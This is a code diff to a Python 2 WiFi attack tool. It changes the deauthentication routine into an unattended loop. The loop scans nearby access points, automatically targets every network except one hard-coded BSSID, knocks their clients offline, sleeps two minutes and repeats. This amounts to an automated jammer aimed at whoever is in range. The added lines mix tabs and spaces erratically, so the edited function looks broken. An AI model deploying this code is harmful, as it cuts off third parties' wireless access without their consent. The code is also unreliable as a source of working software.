@@ -480,78 +480,79 @@ def dns_sniff():
         disable_ip_forwarding()
         
 def deauth_attack():
-    interface = get_interface()
-    enable_mon_mode(interface)
+		while True:
+			interface = get_interface()
+			enable_mon_mode(interface)
 
-    wifiscan = scan.WifiScan(interface)
-    wifiscan.do_output = False
-    wifiscan.timeout = 8
+			wifiscan = scan.WifiScan(interface)
+			wifiscan.do_output = False
+			wifiscan.timeout = 8
 
-    hopT = Thread(target=wifiscan.channelhop, args=[])
-    hopT.daemon = True
-    hopT.start()
+			hopT = Thread(target=wifiscan.channelhop, args=[])
+			hopT.daemon = True
+			hopT.start()
 
-    clear_screen()
-    print("[{Y}*{N}] Searching for WiFi-Networks... (10 sec.)\n".format(Y=YELLOW, N=NORMAL))
+			clear_screen()
+			print("[{Y}*{N}] Searching for WiFi-Networks... (10 sec.)\n".format(Y=YELLOW, N=NORMAL))
 
-    wifiscan.do_scan()
-    wifiscan.channelhop_active = False
-    access_points = wifiscan.get_access_points()
+			wifiscan.do_scan()
+			wifiscan.channelhop_active = False
+			access_points = wifiscan.get_access_points()
 
-    if len(access_points) < 1:
-        print("{R}No networks found :({N}".format(R=RED, N=NORMAL))
-        sys.exit(0)
+			if len(access_points) < 1:
+					print("{R}No networks found :({N}".format(R=RED, N=NORMAL))
+					sys.exit(0)
 
-    print("{Y}Available networks:{N}\n".format(Y=YELLOW, N=NORMAL))
+			print("{Y}Available networks:{N}\n".format(Y=YELLOW, N=NORMAL))
 
-    ap_in =''
-    num = 1
-    for bssid in access_points.keys():
-        space = 2
-        if num > 9:
-            space = 1
+			ap_in =''
+			num = 1
+			for bssid in access_points.keys():
+					space = 2
+					if num > 9:
+							space = 1
 
-	essid = access_points[bssid]["essid"]
-        access_points[bssid]["num"] = num
-        print("   [{R}{num}{N}]{sp}{bssid} | {essid}".format(num=num, R=RED, N=NORMAL, bssid=bssid.upper(), essid=essid, sp=" "*space))
-	if bssid.upper() != 'B4:A5:EF:05:0E:74':
-		ap_in+=str(num)
-		ap_in+=str(',')
-	print ap_in;
-        num += 1
-    ap_in = ap_in[:-1]
-    print("\nSeperate multiple targets with {R}','{N} (comma).".format(R=RED, N=NORMAL))
+		essid = access_points[bssid]["essid"]
+					access_points[bssid]["num"] = num
+					print("   [{R}{num}{N}]{sp}{bssid} | {essid}".format(num=num, R=RED, N=NORMAL, bssid=bssid.upper(), essid=essid, sp=" "*space))
+		if bssid.upper() != 'B4:A5:EF:05:0E:74':
+			ap_in+=str(num)
+			ap_in+=str(',')
+		print ap_in;
+					num += 1
+			ap_in = ap_in[:-1]
+			print("\nSeperate multiple targets with {R}','{N} (comma).".format(R=RED, N=NORMAL))
 
-    while True:
-        ap_in = ap_in.replace(" ", "")
-	print ap_in
-        if not "," in ap_in:
-            ap_list_in = [ap_in]
-        else:
-             ap_list_in = ap_in.split(",")
+			while True:
+					ap_in = ap_in.replace(" ", "")
+		print ap_in
+					if not "," in ap_in:
+							ap_list_in = [ap_in]
+					else:
+							 ap_list_in = ap_in.split(",")
 
-        if not all(x.isdigit() for x in ap_list_in) or not all(int(x) in range(len(access_points)+1) for x in ap_list_in):
-            print("{R}ERROR: Invalid input.{N}".format(R=RED, N=NORMAL))
-            break
+					if not all(x.isdigit() for x in ap_list_in) or not all(int(x) in range(len(access_points)+1) for x in ap_list_in):
+							print("{R}ERROR: Invalid input.{N}".format(R=RED, N=NORMAL))
+							break
 
-        break
+					break
 
-    clear_screen()
-    printings.deauth_ap()
+			clear_screen()
+			printings.deauth_ap()
 
-    ap_list = {}
+			ap_list = {}
 
-    for bssid in access_points:
-        for num in ap_list_in:
-            if int(num) == access_points[bssid]["num"]:
-                print(" ->   {bssid} | {essid}".format(bssid=bssid.upper(), essid=access_points[bssid]["essid"]))
-                ap_list[bssid] = access_points[bssid]["ch"]
+			for bssid in access_points:
+					for num in ap_list_in:
+							if int(num) == access_points[bssid]["num"]:
+									print(" ->   {bssid} | {essid}".format(bssid=bssid.upper(), essid=access_points[bssid]["essid"]))
+									ap_list[bssid] = access_points[bssid]["ch"]
 
-    print("\n")
+			print("\n")
 
-    deauthent = deauth.Deauth(ap_list, interface)
-    deauthent.start_deauth()
-
+			deauthent = deauth.Deauth(ap_list, interface)
+			deauthent.start_deauth()
+		sleep(120)
 
 def main():
     # Signal handler to catch KeyboardInterrupts
